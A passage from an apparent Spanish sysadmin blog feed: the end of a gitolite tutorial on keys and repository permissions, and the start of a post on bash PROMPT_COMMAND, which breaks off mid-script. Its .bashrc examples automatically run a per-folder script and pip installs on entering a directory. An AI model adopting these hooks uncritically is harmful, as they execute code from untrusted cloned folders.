    IdentityFile ~/docker/gitolite/keys/gerard
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Administrando gitolite&lt;/h2&gt;
&lt;p&gt;Como ya se ha indicado, el usuario &lt;em&gt;admin&lt;/em&gt; debe clonar el repositorio &lt;em&gt;gitolite-admin&lt;/em&gt; para editar los cambios. En principio es el único usuario y tiene permisos sobre el repositorio mencionado. Podemos ver sus permisos intentando entrar al servidor por SSH (recordad que lo he mapeado al puerto 22 de mi máquina).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace$ ssh -i ../keys/admin git@localhost
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
PTY allocation request failed on channel &lt;span class="m"&gt;0&lt;/span&gt;
hello admin, this is git@gitolite running gitolite3 v3.4.0-4380-g8bd1571 on git &lt;span class="m"&gt;2&lt;/span&gt;.11.2

 R W    gitolite-admin
 R W    testing
Connection to localhost closed.
gerard@aldebaran:~/docker/gitolite/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alternativamente podemos usar el &lt;em&gt;host&lt;/em&gt; declarado en la configuración SSH cliente (el truco está más arriba):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace$ ssh gitolite-admin
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
PTY allocation request failed on channel &lt;span class="m"&gt;0&lt;/span&gt;
hello admin, this is git@gitolite running gitolite3 v3.4.0-4380-g8bd1571 on git &lt;span class="m"&gt;2&lt;/span&gt;.11.2

 R W    gitolite-admin
 R W    testing
Connection to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 closed.
gerard@aldebaran:~/docker/gitolite/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La sesión se cierra, ya que la función de este SSH es solamente hacer las operaciones remotas de &lt;em&gt;clone&lt;/em&gt;, &lt;em&gt;pull&lt;/em&gt; y &lt;em&gt;push&lt;/em&gt;. Cualquier otro usuario va a fallar si intenta entrar al servidor de la misma forma, ya que no hay nadie más autorizado.&lt;/p&gt;
&lt;p&gt;Para realizar modificaciones tenemos que clonar el repositorio de administración:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace$ git clone gitolite-admin:gitolite-admin.git
Cloning into &lt;span class="s1"&gt;&amp;#39;gitolite-admin&amp;#39;&lt;/span&gt;...
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
remote: Counting objects: &lt;span class="m"&gt;6&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/4&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
remote: Total &lt;span class="m"&gt;6&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
Receiving objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;6&lt;/span&gt;/6&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Checking connectivity... &lt;span class="k"&gt;done&lt;/span&gt;.
gerard@aldebaran:~/docker/gitolite/workspace$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto nos da el repositorio de administración, que de por sí, es bastante intuitivo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ tree
.
├── conf
│   └── gitolite.conf
└── keydir
    └── admin.pub

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;2&lt;/span&gt; files
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La carpeta &lt;em&gt;keydir&lt;/em&gt; es donde hay que poner las claves de los usuarios SSH para que puedan entrar en la máquina. Es importante poner el formato &lt;code&gt;&amp;lt;usuario&amp;gt;.pub&lt;/code&gt; donde &lt;code&gt;usuario&lt;/code&gt; es el usuario tal como lo conoce &lt;strong&gt;gitolite&lt;/strong&gt; y como hay que indicar en los permisos; da igual como se llama la clave privada en la máquina del usuario (por ejemplo, &lt;em&gt;id_rsa&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;El fichero &lt;em&gt;conf/gitolite.conf&lt;/em&gt; tiene la especificación de los repositorios y los permisos que tienen los usuarios sobre ellos.&lt;/p&gt;
&lt;h3&gt;Añadiendo usuarios&lt;/h3&gt;
&lt;p&gt;Para añadir o retirar usuarios, basta con añadir o quitar su clave de la carpeta &lt;em&gt;keydir&lt;/em&gt; en nuestro repositorio local, para posteriormente hacer el correspondiente &lt;em&gt;push&lt;/em&gt;. Por ejemplo, añado la clave para mi usuario:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ tree
.
├── conf
│   └── gitolite.conf
└── keydir
    ├── admin.pub
    └── gerard.pub

&lt;span class="m"&gt;2&lt;/span&gt; directories, &lt;span class="m"&gt;3&lt;/span&gt; files
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ git add keydir/gerard.pub 
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ git commit -m &lt;span class="s2"&gt;&amp;quot;Add user gerard&amp;quot;&lt;/span&gt;
...
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos ver que ahora puedo usar el usuario &lt;em&gt;gerard&lt;/em&gt; para hacer SSH, pero que los repositorios a los que tiene acceso no son los mismos; de hecho, viene uno llamado &lt;em&gt;testing&lt;/em&gt; por defecto. Recordad que &lt;strong&gt;gitolite&lt;/strong&gt; decide el usuario en función de la clave SSH usada, y esta la he puesto en la configuración SSH cliente en &lt;em&gt;~/.ssh/config&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ ssh gitolite-admin
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
PTY allocation request failed on channel &lt;span class="m"&gt;0&lt;/span&gt;
hello admin, this is git@gitolite running gitolite3 v3.4.0-4380-g8bd1571 on git &lt;span class="m"&gt;2&lt;/span&gt;.11.2

 R W    gitolite-admin
 R W    testing
Connection to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 closed.
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ ssh gitolite-gerard
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
PTY allocation request failed on channel &lt;span class="m"&gt;0&lt;/span&gt;
hello gerard, this is git@gitolite running gitolite3 v3.4.0-4380-g8bd1571 on git &lt;span class="m"&gt;2&lt;/span&gt;.11.2

 R W    testing
Connection to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 closed.
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El punto interesante de todo esto es que todos los usuarios utilizan un &lt;em&gt;shell&lt;/em&gt; restringido, pero este acepta un parámetro, que es el usuario. Este parámetro es forzado por SSH cuando alguna de las líneas del fichero &lt;em&gt;authorized_keys&lt;/em&gt; da positivo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ docker &lt;span class="nb"&gt;exec&lt;/span&gt; gitolite cat /var/lib/git/.ssh/authorized_keys
&lt;span class="c1"&gt;# gitolite start&lt;/span&gt;
&lt;span class="nv"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/lib/gitolite/gitolite-shell admin&amp;quot;&lt;/span&gt;,no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa ...  
&lt;span class="nv"&gt;command&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/usr/lib/gitolite/gitolite-shell gerard&amp;quot;&lt;/span&gt;,no-port-forwarding,no-X11-forwarding,no-agent-forwarding,no-pty ssh-rsa ...  
&lt;span class="c1"&gt;# gitolite end&lt;/span&gt;
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Administrando repositorios y permisos&lt;/h3&gt;
&lt;p&gt;El fichero clave para esto es &lt;em&gt;conf/gitolite.conf&lt;/em&gt;. Si vemos lo que tiene, comprenderemos inmediatamente lo que hay que hacer.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ cat conf/gitolite.conf 
repo gitolite-admin
    RW+     &lt;span class="o"&gt;=&lt;/span&gt;   admin

repo testing
    RW+     &lt;span class="o"&gt;=&lt;/span&gt;   @all
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se trata de repositorios (o grupos) con una lista tabulada de permisos y usuarios o grupos a los que afectan. Más información en &lt;a href="http://gitolite.com/gitolite/conf/"&gt;la documentación&lt;/a&gt;. El grupo &lt;em&gt;all&lt;/em&gt; es especial y viene predefinido.&lt;/p&gt;
&lt;p&gt;Vamos a poner algunos repositorios, grupos y permisos:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ cat conf/gitolite.conf 
@devs &lt;span class="o"&gt;=&lt;/span&gt; dev1 dev2 dev3
@ops &lt;span class="o"&gt;=&lt;/span&gt; ops1
@staff &lt;span class="o"&gt;=&lt;/span&gt; @devs @ops

@blog &lt;span class="o"&gt;=&lt;/span&gt;  blog-public blog-admin
@shop &lt;span class="o"&gt;=&lt;/span&gt; shop-public shop-admin shop-api

repo gitolite-admin
    RW+ &lt;span class="o"&gt;=&lt;/span&gt; admin

repo @blog
    RW+ &lt;span class="o"&gt;=&lt;/span&gt; gerard
    &lt;span class="nv"&gt;RW&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; @devs
    &lt;span class="nv"&gt;R&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; @ops

repo @shop
    RW+ &lt;span class="o"&gt;=&lt;/span&gt; @staff
    &lt;span class="nv"&gt;R&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; gerard
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ git add conf/gitolite.conf 
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ git commit -m &lt;span class="s2"&gt;&amp;quot;Added some projects and permissions&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;master f8fe801&lt;span class="o"&gt;]&lt;/span&gt; Added some projects and permissions
 &lt;span class="m"&gt;1&lt;/span&gt; file changed, &lt;span class="m"&gt;16&lt;/span&gt; insertions&lt;span class="o"&gt;(&lt;/span&gt;+&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;3&lt;/span&gt; deletions&lt;span class="o"&gt;(&lt;/span&gt;-&lt;span class="o"&gt;)&lt;/span&gt;
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ git push
...  
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
Counting objects: &lt;span class="m"&gt;4&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Delta compression using up to &lt;span class="m"&gt;4&lt;/span&gt; threads.
Compressing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;/3&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="k"&gt;done&lt;/span&gt;.
Writing objects: &lt;span class="m"&gt;100&lt;/span&gt;% &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;/4&lt;span class="o"&gt;)&lt;/span&gt;, &lt;span class="m"&gt;474&lt;/span&gt; bytes &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt; bytes/s, &lt;span class="k"&gt;done&lt;/span&gt;.
Total &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;, reused &lt;span class="m"&gt;0&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;delta &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
remote: Initialized empty Git repository in /var/lib/git/repositories/blog-admin.git/
remote: Initialized empty Git repository in /var/lib/git/repositories/blog-public.git/
remote: Initialized empty Git repository in /var/lib/git/repositories/shop-admin.git/
remote: Initialized empty Git repository in /var/lib/git/repositories/shop-api.git/
remote: Initialized empty Git repository in /var/lib/git/repositories/shop-public.git/
To gitolite-admin:gitolite-admin.git
   &lt;span class="m"&gt;5114865&lt;/span&gt;..f8fe801  master -&amp;gt; master
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y solo nos queda ver los permisos que tenemos ahora con los diferentes usuarios:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ ssh gitolite-admin
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
PTY allocation request failed on channel &lt;span class="m"&gt;0&lt;/span&gt;
hello admin, this is git@gitolite running gitolite3 v3.4.0-4380-g8bd1571 on git &lt;span class="m"&gt;2&lt;/span&gt;.11.2

 R W    gitolite-admin
Connection to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 closed.
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ ssh gitolite-gerard
Warning: Permanently added &lt;span class="s1"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;RSA&lt;span class="o"&gt;)&lt;/span&gt; to the list of known hosts.
PTY allocation request failed on channel &lt;span class="m"&gt;0&lt;/span&gt;
hello gerard, this is git@gitolite running gitolite3 v3.4.0-4380-g8bd1571 on git &lt;span class="m"&gt;2&lt;/span&gt;.11.2

 R W    blog-admin
 R W    blog-public
 R      shop-admin
 R      shop-api
 R      shop-public
Connection to &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 closed.
gerard@aldebaran:~/docker/gitolite/workspace/gitolite-admin$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El repositorio &lt;em&gt;testing&lt;/em&gt; no aparece en la configuración, pero sus datos siguen en el servidor. En caso de querer eliminarlo definitivamente, necesitamos eliminar su carpeta entrando en el servidor.&lt;/p&gt;</content><category term="git"></category><category term="gitolite"></category></entry><entry><title>Explorando bash: la variable de entorno PROMPT_COMMAND</title><link href="http://www.linuxsysadmin.ml/2017/06/explorando-bash-la-variable-de-entorno-prompt-command.html" rel="alternate"></link><published>2017-06-19T10:00:00+02:00</published><updated>2017-06-19T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2017-06-19:/2017/06/explorando-bash-la-variable-de-entorno-prompt-command.html</id><summary type="html">&lt;p&gt;Los &lt;em&gt;gurús&lt;/em&gt; del terminal ya conocemos muchas de las virtudes de &lt;strong&gt;bash&lt;/strong&gt;. Sin embargo, es una utilidad muy grande y no es raro que cada vez que busquemos encontremos cosas nuevas. Esta vez, y casi por curiosidad, encontré una variable llamada &lt;strong&gt;PROMPT_COMMAND&lt;/strong&gt;, que aunque no es conocida, es muy útil …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Los &lt;em&gt;gurús&lt;/em&gt; del terminal ya conocemos muchas de las virtudes de &lt;strong&gt;bash&lt;/strong&gt;. Sin embargo, es una utilidad muy grande y no es raro que cada vez que busquemos encontremos cosas nuevas. Esta vez, y casi por curiosidad, encontré una variable llamada &lt;strong&gt;PROMPT_COMMAND&lt;/strong&gt;, que aunque no es conocida, es muy útil.&lt;/p&gt;
&lt;p&gt;El cometido de esta variable de entorno es el de ejecutar un comando de &lt;strong&gt;bash&lt;/strong&gt; antes de pintar el símbolo de sistema, según &lt;a href="http://www.tldp.org/HOWTO/Bash-Prompt-HOWTO/x264.html"&gt;la documentación&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Bash provides an environment variable called PROMPT_COMMAND. The contents of this variable are executed as a regular Bash command just before Bash displays a prompt.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;No parece muy impresionante a simple vista, pero con algunas ideas adecuadas nos puede quitar mucho trabajo, automatizando aquellas tareas que hacemos cuando entramos en la carpeta, con vistas a trabajar en ella.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTA&lt;/strong&gt;: En todos los ejemplos vamos a definir la variable &lt;strong&gt;PROMPT_COMMAND&lt;/strong&gt; en el fichero &lt;em&gt;.bashrc&lt;/em&gt;, para que se haga automáticamente. Para que se active, hace falta hacer un &lt;em&gt;source&lt;/em&gt; del fichero o abrir de nuevo el terminal; no siempre se menciona en los ejemplos.&lt;/p&gt;
&lt;h2&gt;Un comando informativo e incondicional&lt;/h2&gt;
&lt;p&gt;¿Que hay mas útil que saber la hora del día sin tener que salir del terminal? Podemos poner una función que nos informe de la hora cada vez que pintemos el símbolo del sistema. Luego enchufamos esta función en la variable de entorno, y cada vez que lo pinte, tenemos un bonito reloj.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .bashrc 
...
prompt_command&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;echo&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;Current time: &amp;quot;&lt;/span&gt;
    date &lt;span class="s2"&gt;&amp;quot;+%Y-%m-%d %H:%M:%S&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;prompt_command
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo hace falta abrir de nuevo el terminal, o hacer un &lt;em&gt;source&lt;/em&gt; del fichero &lt;em&gt;.bashrc&lt;/em&gt;. La siguiente vez que pinte un &lt;em&gt;prompt&lt;/em&gt;, ejecutará antes nuestra función; de hecho lo va a ejecutar tan pronto como acabe el comando &lt;em&gt;source&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;source&lt;/span&gt; .bashrc
Current time: &lt;span class="m"&gt;2017&lt;/span&gt;-01-13 &lt;span class="m"&gt;10&lt;/span&gt;:27:11
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Un conjunto de instrucciones por carpeta&lt;/h2&gt;
&lt;p&gt;Supongamos que cada vez que entremos en una carpeta queremos ejecutar un conjunto distinto de comandos. Solo necesitamos que cada carpeta defina su propio &lt;em&gt;script&lt;/em&gt; para ejecutar. Nuestra función va a darse cuenta de que ese &lt;em&gt;script&lt;/em&gt; existe, y lo va a ejecutar automáticamente en caso afirmativo.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .bashrc 
...
prompt_command&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -x .prompt_command.sh&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt; ./.prompt_command.sh&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PROMPT_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;prompt_command
gerard@aldebaran:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Des esta forma, cada carpeta que tenga un &lt;em&gt;script&lt;/em&gt; llamado &lt;em&gt;.prompt_command.sh&lt;/em&gt; conseguirá que sea ejecutado cada vez que se dibuje el &lt;em&gt;prompt&lt;/em&gt;. Lo que haga el &lt;em&gt;script&lt;/em&gt; ya es un tema de preferencia personal.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ &lt;span class="nb"&gt;cd&lt;/span&gt; projects/
gerard@aldebaran:~$ cat sandbox/.prompt_command.sh
&lt;span class="c1"&gt;#!/bin/bash&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello world&amp;quot;&lt;/span&gt;
gerard@aldebaran:~/projects$ &lt;span class="nb"&gt;cd&lt;/span&gt; sandbox/
Hello world
gerard@aldebaran:~/projects/sandbox$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante ver que solo ha saltado el mensaje informativo en la carpeta &lt;em&gt;sandbox&lt;/em&gt;. De hecho, cada comando que ejecutemos en ella va a disparar el comando. Añadid lógica extra para evitar ejecuciones inútiles.&lt;/p&gt;
&lt;h2&gt;Creación y activado automático de &lt;em&gt;virtualenvs&lt;/em&gt; de python&lt;/h2&gt;
&lt;p&gt;Este es el &lt;em&gt;script&lt;/em&gt; que más trabajo me ahorra. Cuando trabajo con &lt;strong&gt;python&lt;/strong&gt; suelo hacerlo siempre con &lt;em&gt;virtualenv&lt;/em&gt;, y con la variable &lt;strong&gt;PYTHONDONTWRITEBYTECODE&lt;/strong&gt;, para ahorrarme los molestos ficheros &lt;em&gt;.pyc&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;La idea es que activar y desactivar el &lt;em&gt;virtualenv&lt;/em&gt; es tedioso, y me gustaría que se activara automáticamente si la carpeta lo tiene, para desactivarlo al salir de la carpeta, aunque sin desactivarlo en las carpetas subordinadas. Como plus, cuando se active el &lt;em&gt;virtualenv&lt;/em&gt;, también puedo hacer que se defina la variable de entorno y que se creen los &lt;em&gt;virtualenvs&lt;/em&gt; de forma automática si no estuvieran creados.&lt;/p&gt;
&lt;p&gt;Para ello, me basta con una convención simple:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Una carpeta con un fichero &lt;em&gt;requirements.txt&lt;/em&gt; debería tener un &lt;em&gt;virtualenv&lt;/em&gt; llamado &lt;em&gt;.venv&lt;/em&gt; en la misma carpeta, con las dependencias instaladas.&lt;/li&gt;
&lt;li&gt;Una carpeta que tenga una carpeta llamada &lt;em&gt;.venv&lt;/em&gt; asume que es un &lt;em&gt;virtualenv&lt;/em&gt; y lo activa, si no estuviera ya activado.&lt;/li&gt;
&lt;li&gt;En caso de no haber una carpeta &lt;em&gt;.venv&lt;/em&gt; pero hubiera un &lt;em&gt;virtualenv&lt;/em&gt; activo, solo se desactivaría si la nueva carpeta no está dentro de la que contenga el &lt;em&gt;virtualenv&lt;/em&gt; activado.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: Un &lt;em&gt;virtualenv&lt;/em&gt; define una variable de entorno &lt;strong&gt;VIRTUAL_ENV&lt;/strong&gt; con el &lt;em&gt;path&lt;/em&gt; que lo contiene. El resto es una simple comparación de &lt;em&gt;substrings&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@aldebaran:~$ cat .bashrc 
...
prompt_command&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -e requirements.txt -a ! -e .venv&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        virtualenv .venv
        ./.venv/bin/pip install -r requirements.txt
    &lt;span class="k"&gt;fi&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -d .venv&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -z &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
            &lt;span class="nb"&gt;source&lt;/span&gt; .venv/bin/activate
            &lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;PYTHONDONTWRITEBYTECODE&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;
        &lt;span class="k"&gt;fi&lt;/span&gt;
    &lt;span class="k"&gt;else&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;test&lt;/span&gt; -n &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;-5&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; !&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;VIRTUAL_ENV&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;-5&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
                &lt;span class="nb"&gt;unset&lt;/span&gt; PYTHONDONTWRITEBYTECODE
                deactivate
            &lt;span class="k"&gt;fi&lt;/span&gt;
        &lt;span class="k"&gt;fi&lt;/span&gt;
